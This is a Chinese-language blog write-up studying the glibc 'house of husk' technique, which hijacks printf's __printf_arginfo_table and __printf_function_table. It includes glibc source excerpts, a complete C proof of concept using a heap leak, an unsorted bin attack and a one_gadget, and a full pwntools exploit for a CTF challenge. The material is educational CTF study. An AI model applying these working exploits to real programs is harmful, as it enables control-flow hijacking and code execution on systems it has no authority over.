---
title: 关于house of husk的学习总结
tags: 
  - house of husk
categories: 学习总结
abbrlink: 6c83c2a2
---

### house of husk

>介绍：
>
>`house of husk` 是对 `printf` 函数内部进行注册的自定义格式化字符的函数指针进行了劫持
>
>
>
>使用版本：
>
>经过测试，`glibc 2.23--2.35` 版本中，该手法均可用
>
>
>
>漏洞原理：
>
>`printf` 函数通过检查 `__printf_function_table` 是否为空，来判断是否有自定义的格式化字符，如果判定为有的话，则会去执行 `__printf_arginfo_table[spec]` 处的函数指针，在这期间并没有进行任何地址的合法性检查
>
> 
>
>利用方法：
>
>劫持 `__printf_function_table` 使其不为空，劫持 `__printf_arginfo_table` 使其表中存放的 `spec` 的位置是 `backdoor()` ，执行到 `printf` 函数时就可以将执行流劫持到 `backdoor()`
>
>spec是格式化字符，比如最后调用的是 `printf("%X\n",a)`,那么应该将 `__printf_arginfo_table[88]` 的位置写入 `backdoor()`
>
>
>
>使用前提：
>
>1. 能向 `__printf_function_table` 中写入任意数据，使其不为空
>
>2. 能向 `__printf_arginfo_table` 中写入一个可控地址
>
>3. 通过条件 `2` ,让 `__printf_arginfo_table[spec]` 为 `backdoor` 地址
>
>   
>
>攻击效果：
>
>执行到 `printf` 函数时，就可以跳转到 `backdoor` 上

本文出现的 `glibc` 源码均为 `2.27` 版本



首先要先认识下 `__register_printf_function` 函数,该函数的作用是允许用户自定义格式化字符并进行注册（注册的意思是说将自定义格式化字符与相应的处理函数相关联），以打印用户自定义数据类型的数据。

`__register_printf_function` 函数是对 `__register_printf_specifier` 进行的封装，下面是 `__register_printf_specifier` 的源代码

```c
/* Register FUNC to be called to format SPEC specifiers.  */
int
__register_printf_specifier (int spec, printf_function converter,
			     printf_arginfo_size_function arginfo)
{
  if (spec < 0 || spec > (int) UCHAR_MAX)
    {
      __set_errno (EINVAL);
      return -1;
    }

  int result = 0;
  __libc_lock_lock (lock);

  if (__printf_function_table == NULL)
    {
      __printf_arginfo_table = (printf_arginfo_size_function **)
	calloc (UCHAR_MAX + 1, sizeof (void *) * 2);
      if (__printf_arginfo_table == NULL)
	{
	  result = -1;
	  goto out;
	}

      __printf_function_table = (printf_function **)
	(__printf_arginfo_table + UCHAR_MAX + 1);
    }

  __printf_function_table[spec] = converter;
  __printf_arginfo_table[spec] = arginfo;

 out:
  __libc_lock_unlock (lock);

  return result;
}
```

`spec` 是自定义的格式化字符（以 `ASCII` 所表示），比如你使用 `%a` 这个格式化字符来输出自定义的数据类型，那么 `spec` 就是字符 `a`

上面的代码先做了第一个 `if` 判断，要确定 `spec` 位于 `0` 和 `0xff` 之间，如果不在 `ASCII` 码就会返回 `-1`

第二个判断是如果 `__printf_function_table` 为空，那么就通过 `calloc` 来分配两个索引表，并将地址存放到  `__printf_arginfo_table` 和 `__printf_function_table` 中。两个表的大小都为 `0x100` ，可以给 `0~0xff` 的每个字符注册一个函数指针（假设我定义一个 `%X` 的格式化字符，那么 `spec` 就是 `88` ，所以将 `__printf_arginfo_table[88]` 此处存放一个对应处理函数的指针）



**需要注意的是，接下来的利用并不会调用到上面这个函数，但需要用到这个注册自定义格式化字符的前置知识。**



`printf` 函数调用了 `vfprintf` 函数，下面的代码是 `vprintf` 函数中的部分片段，可以看出来如果 `__printf_function_table` 不为空（也就意味着有自定义格式化字符被注册过了）那么就会调用 `printf_positional` 函数,如果为空的话，就会去执行默认格式化字符的代码部分（因此**检查自定义的格式化字符是优先于默认的格式化字符**）

```c
  if (__glibc_unlikely (__printf_function_table != NULL
			|| __printf_modifier_table != NULL
			|| __printf_va_arg_table != NULL))
    goto do_positional;

......

do_positional:
  if (__glibc_unlikely (workstart != NULL))
    {
      free (workstart);
      workstart = NULL;
    }
  done = printf_positional (s, format, readonly_format, ap, &ap_save,
			    done, nspecs_done, lead_str_end, work_buffer,
			    save_errno, grouping, thousands_sep);

```





而 `printf_positional` 函数中会在下面这个位置调用 `__parse_one_specmb` 函数

![image-20230213205442536](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132054421.png)





`__parse_one_specmb` 函数中最关键的就是下面这个片段

```c
  if (__builtin_expect (__printf_function_table == NULL, 1)
      || spec->info.spec > UCHAR_MAX
      || __printf_arginfo_table[spec->info.spec] == NULL
      /* We don't try to get the types for all arguments if the format
	 uses more than one.  The normal case is covered though.  If
	 the call returns -1 we continue with the normal specifiers.  */
      || (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])
				   (&spec->info, 1, &spec->data_arg_type,
				    &spec->size)) < 0)
```

可以看到最后执行了 `(*__printf_arginfo_table[spec->info.spec])` 这里本应是注册的正常的函数指针，但如果我们能够篡改 `__printf_arginfo_table` 中存放的地址，将其改为我们可控的内存地址，这样我只需要在 `__printf_arginfo_table[88]` （以 `%X` 为例）的位置存放一个 `one_gadget` 的地址，执行到函数指针指向的位置即可跳转到 `one_gadget` 上（如下） 

![image-20230213210814663](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132112362.png)

![image-20230213210736611](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132107697.png)

 **注意：上面的利用始终都没有注册自定义的格式化字符，而是通过直接篡改 `__printf_function_table` 来错让程序以为存在注册过的自定义格式化字符，从而触发 `__printf_arginfo_table` 中的函数指针**





`poc` 源自  https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507

```c
/*
 * This is a Proof-of-Concept for House of Husk
 * This PoC is supposed to be run with libc-2.27.
 gcc poc.c -o poc -no-pie -g
 */
#include <stdio.h>
#include <stdlib.h>

#define offset2size(ofs) ((ofs) * 2 - 0x10)
#define MAIN_ARENA       0x3ebc40
#define MAIN_ARENA_DELTA 0x60
#define GLOBAL_MAX_FAST  0x3ed940
#define PRINTF_FUNCTABLE 0x3f0738
#define PRINTF_ARGINFO   0x3ec870
#define ONE_GADGET       0x10a2fc

int main (void)
{
  unsigned long libc_base;
  char *a[10];
  setbuf(stdout, NULL); // make printf quiet

  /* leak libc */
  a[0] = malloc(0x500); /* UAF chunk */
  a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));
  a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));
  a[3] = malloc(0x500); /* avoid consolidation */
  free(a[0]);
  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
  printf("libc @ 0x%lx\n", libc_base);

  /* prepare fake printf arginfo table */
  *(unsigned long*)(a[2] + ('X' - 2) * 8) = libc_base + ONE_GADGET;
    //now __printf_arginfo_table['X'] = one_gadget;
    //*(unsigned long*)(a[1] + ('X' - 2) * 8) = libc_base + ONE_GADGET;
  /* unsorted bin attack */
  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
  a[0] = malloc(0x500); /* overwrite global_max_fast */

  /* overwrite __printf_arginfo_table and __printf_function_table */
  free(a[1]);// __printf_function_table => a heap_addr which is not NULL
  free(a[2]);// => one_gadget

  /* ignite! */
  printf("%X", 0);
  
  return 0;
}

```









### 例题分析

[题目链接](https://github.com/xmzyshypnc/xz_files/tree/master/34c4_readme_revenge)

#### 保护策略

![image-20230214123424178](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141234308.png)

#### 程序分析

![image-20230214123517550](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141235591.png)

程序就是往 `bss` 段上输入数据，然后 `printf` 将数据打印出来。

程序为静态链接，并且 `flag` 就在 `data` 段中，只要将其读出来即可

![image-20230214123826356](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141238392.png)



程序没有开 `PIE` 保护，因为静态链接的原因，所以 `libc` 中的代码和数据地址都是已知的，这就给了我们劫持 `printf` 函数中 `__printf_arginfo_table` 和 `__printf_function_table` 两个指针的机会

我们先搜一下这两个地址看看在哪

![image-20230214124341330](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141243372.png)

发现输入数据的起始地址 `name` 比那两个指针要低，这就说明我们可以填充数据然后篡改两个指针，从而执行 `printf` 函数的时候劫持执行流



#### 利用方法

正常填充垃圾数据，将 `__printf_function_table` 篡改为任意值（不为 `NULL`）即可。

将 `__printf_arginfo_table` 篡改为 `地址A` （这个 `地址A` 随意，只要满足 `*(A+(0x73*8))` 处的值为 `__stack_chk_fail()` 的地址就行（ `0x73` 是 格式化字符`s` ））

但如果仅仅只伪造上面两个位置的数据，其他地方填充为垃圾数据的话，则会在 `__parse_one_specmb` 函数中下面的代码部分出现问题

```c
  if (__builtin_expect (__printf_modifier_table == NULL, 1)
      || __printf_modifier_table[*format] == NULL
      || HANDLE_REGISTERED_MODIFIER (&format, &spec->info) != 0)
```

在溢出伪造数据时，需要控制 `__printf_modifier_table` 为 `NULL` 不然会触发一些别的条件的判断导致程序崩溃或者执行流走偏，这个 `__printf_modifier_table` 位于 `__printf_function_table` 地址加 `8` 的位置



满足上面的部分就可以成功在 `*__printf_arginfo_table[spec->info.spec]` 这个位置来劫持执行流，我们将此处控制为 `__stack_chk_fail()` ，该函数执行时，会打印出 `__libc_argv[0]` 指向的字符串

先确定 `__libc_argv[0]` 的地址（如下）

![image-20230214131007737](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141310775.png)

然后需要向这个地址里写入一个指向 `flag` 地址的指针。

我布置的情况如下

![image-20230214131134190](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141311225.png)



上述布局全部完成，执行 `printf((__int64)"Hi, %s. Bye.\n", name);` 时就可以将 `flag` 打印出来



#### EXP

[tools源码](https://zikh26.github.io/posts/ad411136.html)

```py
from tools import *
#context.log_level='debug'
context.arch='amd64'
p=load('readme_revenge')
debug(p,0x45ad0f)
leak_flag=0x4359B0
flag_addr=0x6B4040
payload=p64(flag_addr)+b'a'*0x598
payload+=p64(0x6B73E0)#__libc_argv[0]
payload+=b'a'*(0x640-0x5a0)
payload+=p64(0xdeadbeef)#__printf_function_table
payload+=p64(0x0)#__printf_modifier_table
payload+=b'a'*0x70
payload+=p64(0x6b7aa8)#__printf_arginfo_table
payload+=p64(0xdeadbeef)*0x72
payload+=p64(leak_flag)#__stack_chk_fail
p.sendline(payload)
p.interactive()

```

![image-20230214131708408](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141317933.png)



### 总结

没想到日常使用的 `printf` 函数也是可以劫持执行流的。但需要注意该手法的利用条件其实有些苛刻，而且没有办法控制参数，只能劫持到 `one_gadget` 或者不需要参数的地址。所以除了少部分的题目外，该手法并不是一个最优的选择，但通过 `house of husk` 也让我了解到了 `printf` 函数中对于自定义格式化字符的处理流程以及可劫持执行流的位置，正所谓技多不压身，`house of husk` 确实是一个有趣的攻击思路
